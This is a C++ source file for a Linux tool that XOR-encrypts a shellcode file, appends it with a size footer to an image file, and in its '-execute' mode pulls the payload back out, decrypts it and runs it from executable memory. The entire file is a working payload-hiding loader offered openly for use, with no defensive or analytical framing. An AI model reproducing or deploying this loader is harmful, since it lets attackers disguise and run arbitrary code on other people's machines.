#include <cstring>
#include <fstream>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <sys/mman.h>
#include <unistd.h>
#include <cstdint>

using namespace std;
namespace fs = filesystem;

vector<char> ReadFile(const string& path) {
    if (!fs::exists(path)) {
        cerr << "[-] Error: File does not exist: " << path << endl;
        return {};
    }
    ifstream file(path, ios::binary | ios::ate);
    if (!file.is_open()) {
        cerr << "[-] Error: Could not open file: " << path << endl;
        return {};
    }
    streamsize size = file.tellg();
    file.seekg(0, ios::beg);
    vector<char> buffer(size);
    if (!file.read(buffer.data(), size)) {
        cerr << "[-] Error: Failed to read file: " << path << endl;
        return {};
    }
    file.close();
    return buffer;
}

vector<char> XOREncryptDecrypt(const vector<char>& data, const string& key) {
    if (key.empty()) {
        throw runtime_error("XOR key cannot be empty");
    }
    vector<char> result = data;
    for (size_t i = 0; i < data.size(); i++) {
        result[i] ^= key[i % key.size()];
    }
    return result;
}

vector<char> InjectEncryptedPayload(const vector<char>& buffer, const vector<char>& shellcode, const string& key) {
    vector<char> result = buffer;
    vector<char> encrypted_shellcode = XOREncryptDecrypt(shellcode, key);
    result.insert(result.end(), encrypted_shellcode.begin(), encrypted_shellcode.end());

    // Append shellcode "size" as 8-byte footer
    uint64_t shellcode_size = shellcode.size();
    char* size_bytes = reinterpret_cast<char*>(&shellcode_size);
    result.insert(result.end(), size_bytes, size_bytes + sizeof(uint64_t));
    return result;
}

vector<char> ExtractAndDecryptShellcode(const vector<char>& file_data, const string& xor_key) {
    // Check if file is large enough to contain at least the size footer
    if (file_data.size() < sizeof(uint64_t)) {
        throw runtime_error("File too small to contain shellcode size metadata");
    }
    // Read the shellcode size from the last 8 bytes
    size_t size_pos = file_data.size() - sizeof(uint64_t);
    uint64_t shellcode_size;
    memcpy(&shellcode_size, file_data.data() + size_pos, sizeof(uint64_t));
    // Check if file is large enough to contain the shellcode
    if (file_data.size() < shellcode_size + sizeof(uint64_t)) {
        throw runtime_error("File too small to contain the shellcode");
    }
    // Extract the encrypted shellcode
    size_t payload_start = file_data.size() - shellcode_size - sizeof(uint64_t);
    vector<char> encrypted_payload(file_data.begin() + payload_start, file_data.begin() + size_pos);
    return XOREncryptDecrypt(encrypted_payload, xor_key);
}

void extractAndRunShellcode(const string& filepath, const string& xor_key) {
    vector<char> file_data = ReadFile(filepath);
    if (file_data.empty()) {
        cerr << "[-] Error: Failed to load file: " << filepath << endl;
        return;
    }

    try {
        vector<char> shellcode = ExtractAndDecryptShellcode(file_data, xor_key);
        cout << "Extracted and decrypted shellcode (" << shellcode.size() << " bytes)" << endl;
        cout << "XOR key used: " << xor_key << endl;

        // Allocate executable memory
        void* exec_mem = mmap(NULL, shellcode.size(), PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (exec_mem == MAP_FAILED) {
            perror("Failed to allocate executable memory");
            return;
        }

        // Copy shellcode to the allocated executable memory
        memcpy(exec_mem, shellcode.data(), shellcode.size());

        // Execute the shellcode
        cout << "Executing shellcode...\n";
        void (*shellcode_func)() = (void (*)())exec_mem;
        shellcode_func();

        // Deallocate the executable memory
        munmap(exec_mem, shellcode.size());

    } catch (const exception& e) {
        cerr << "Error extracting shellcode: " << e.what() << endl;
    }
}

void printUsage(const char* program_name) {
    cerr << "Usage for injection: " << program_name
         << " <input_image_path> <output_image_path> <shellcode_path> -key <xor_key_string>" << endl;
    cerr << "Usage for execution: " << program_name
         << " -execute <image_with_shellcode> -key <xor_key_string>" << endl;
    cerr << "XOR key is a user-defined string for encryption" << endl;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printUsage(argv[0]);
        return 1;
    }

    bool execute = false;
    string inputImagePath, outputImagePath, shellcodePath,key;

    for (int i = 1; i < argc; ++i) {
        string arg = argv[i];
        if (arg == "-execute" && i + 1 < argc) {
            execute = true;
            inputImagePath = argv[++i];
        } else if (arg == "-key" && i + 1 < argc) {
            key = argv[++i];
            if (key.empty()) {
                cerr << "[-] Error: XOR key cannot be empty" << endl;
                printUsage(argv[0]);
                return 1;
            }
        } else if (inputImagePath.empty()) {
            inputImagePath = arg;
        } else if (!execute && outputImagePath.empty()) {
            outputImagePath = arg;
        } else if (!execute && shellcodePath.empty()) {
            shellcodePath = arg;
        } else {
            cerr << "[-] Error: Unexpected argument: " << arg << endl;
            printUsage(argv[0]);
            return 1;
        }
    }

    // Validate required parameters
    if (execute) {
        if (inputImagePath.empty() || key.empty()) {
            cerr << "[-] Error: Execution requires input file path and XOR key" << endl;
            printUsage(argv[0]);
            return 1;
        }
        extractAndRunShellcode(inputImagePath, key);
    } else {
        if (inputImagePath.empty() || outputImagePath.empty() || shellcodePath.empty() || key.empty()) {
            cerr << "[-] Error: Injection requires input image, output image, shellcode paths, and XOR key" << endl;
            printUsage(argv[0]);
            return 1;
        }

        vector<char> image = ReadFile(inputImagePath);
        if (image.empty()) {
            cerr << "[-] Error: Failed to load input image: " << inputImagePath << endl;
            return 1;
        }

        vector<char> shellcode = ReadFile(shellcodePath);
        if (shellcode.empty()) {
            cerr << "[-] Error: Failed to load shellcode: " << shellcodePath << endl;
            return 1;
        }

        cout << "\n=== File info ===" << endl;
        cout << "Input file:  " << inputImagePath << endl;
        cout << "Output file: " << outputImagePath << endl;
        cout << "Payload file: " << shellcodePath << endl;
        cout << "Image size:  " << image.size() << " bytes" << endl;
        cout << "Payload size: " << shellcode.size() << " bytes" << endl;
        cout << "XOR key: " << key << endl;

        // Encrypt and inject payload
        vector<char> newFile = InjectEncryptedPayload(image, shellcode, key);

        // Write the new file
        ofstream nFile(outputImagePath, ios::binary);
        if (!nFile.is_open()) {
            cerr << "[-] Error: Could not create or write to file: " << outputImagePath << endl;
            return 1;
        }

        nFile.write(newFile.data(), newFile.size());
        nFile.close();

        cout << "\n[+] Success: File written to " << outputImagePath << endl;
        cout << "[+] Encrypted and injected " << shellcode.size() << " bytes" << endl;
        cout << "[+] New file size: " << newFile.size() << " bytes" << endl;
        cout << "[+] Remember these parameters for execution:" << endl;
        cout << "[+]   XOR key: " << key << endl;
    }

    return 0;
}
